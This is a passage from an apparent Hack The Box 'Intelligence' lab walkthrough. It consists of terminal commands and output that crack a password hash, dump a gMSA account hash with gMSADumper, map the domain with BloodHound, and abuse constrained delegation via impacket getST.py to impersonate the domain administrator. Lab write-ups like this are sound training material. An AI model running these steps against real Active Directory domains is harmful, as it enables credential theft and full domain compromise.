Time.Estimated...: Wed Oct 27 00:59:13 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   762.2 kH/s (2.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10817536/14344385 (75.41%)
Rejected.........: 0/10817536 (0.00%)
Restore.Point....: 10813440/14344385 (75.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Ms.Jordan -> Money01

Started: Wed Oct 27 00:58:01 2021
Stopped: Wed Oct 27 00:59:14 2021
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/gMSADumper]
└─# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l intelligence.htb 
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/gMSADumper]
└─# john svc_int_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2021-10-27 01:02) 0g/s 7795Kp/s 7795Kc/s 7795KC/s      markinho..*7¡Vamos!
Session completed
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
└─# python3 bloodhound.py -u Ted.Graves -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c All               127 ⨯
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 3.202622175216675 seconds
INFO: Done in 00M 27S
```

```
──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
└─# python3 -m json.tool 20211027010910_computers.json | grep -iA 10 svc                                          1 ⨯
                "name": "SVC_INT.INTELLIGENCE.HTB",
                "objectid": "S-1-5-21-4210132550-3389855604-3437519686-1144",
                "domain": "INTELLIGENCE.HTB",
                "highvalue": false,
                "distinguishedname": "CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb",
                "unconstraineddelegation": false,
                "enabled": true,
                "haslaps": false,
                "lastlogontimestamp": -1,
                "pwdlastset": 1635336145,
                "serviceprincipalnames": [],
                "description": null,
                "operatingsystem": null,
                "allowedtodelegate": [
                    "WWW/dc.intelligence.htb"
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
└─# python3 /usr/share/doc/python3-impacket/examples/getST.py -hashes :c699eaac79b69357d9dabee3379547e6 -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$ 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

```
──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
└─# sudo ntpdate 10.10.10.248
27 Oct 08:16:50 ntpdate[55600]: step time server 10.10.10.248 offset +25294.408715 sec
```

```
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
└─# python3 /usr/share/doc/python3-impacket/examples/getST.py -hashes :c699eaac79b69357d9dabee3379547e6 -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
└─# export KRB5CCNAME=`pwd`/administrator.ccache
```
